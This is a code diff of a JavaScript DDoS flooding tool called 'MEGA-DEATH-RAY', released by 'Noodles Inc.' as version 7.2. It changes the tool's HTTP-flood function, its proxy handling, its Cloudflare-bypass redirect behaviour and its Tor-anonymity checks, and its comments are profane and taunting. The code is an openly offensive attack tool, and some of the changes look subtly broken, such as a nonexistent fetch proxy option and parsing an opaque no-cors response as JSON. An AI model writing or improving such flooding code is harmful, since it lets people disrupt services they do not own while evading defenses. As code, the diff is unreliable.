@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.1)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.2)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -215,19 +215,13 @@ async function httpFlood(url, hexBytes, proxy) {
         'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
     ];
     const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-    let proxyUrl = '';
-
-    if (proxy) {
-        proxyUrl = `http://${proxy}`;
-    }
 
     // Add extra malicious headers, because why the fuck not?
     try {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
-        let targetURL = url;
 
-        let fetchOptions = {
+        const fetchOptions = {
             mode: 'no-cors', // Bypass CORS like a goddamn ninja.
             method: 'GET', // GET request – simple, effective, like a kick to the balls.
             headers: {
@@ -246,16 +240,10 @@ async function httpFlood(url, hexBytes, proxy) {
             },
             redirect: 'follow', // Follow redirects to try and bypass Cloudflare
             signal: controller.signal,
+            proxy: proxy, // Use proxy server if provided
         };
 
-        // Use proxy if available
-        if (proxy) {
-            // Implement proxy functionality using a service like CORS Anywhere
-            const corsProxyUrl = 'https://cors-anywhere.herokuapp.com/'; // Replace with your CORS proxy
-            targetURL = corsProxyUrl + url;  // Append target URL to the CORS proxy
-        }
-
-        const response = await fetch(targetURL, fetchOptions);
+        const response = await fetch(url, fetchOptions);
 
         clearTimeout(timeoutId);
 
@@ -352,7 +340,7 @@ secureHeaders.forEach(header => {
 // TOR Compatibility and Enhanced Anonymity
 const torCheckInterval = setInterval(async () => {
     try {
-        const torExitNode = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
+        const torExitNode = await fetch('https://check.torproject.org/api/ip', { mode: 'no-cors' });
         const torData = await torExitNode.json();
         if (torData.IsTor === true) {
             logAction('TOR detected: Enhanced anonymity enabled. Proceed with fucking caution.');
@@ -379,7 +367,7 @@ async function onionCheck(url) {
 
 async function isTorRunning() {
     try {
-        const response = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
+        const response = await fetch('https://check.torproject.org/api/ip', { mode: 'no-cors' });
         const data = await response.json();
         return data.IsTor === true;
     } catch (error) {
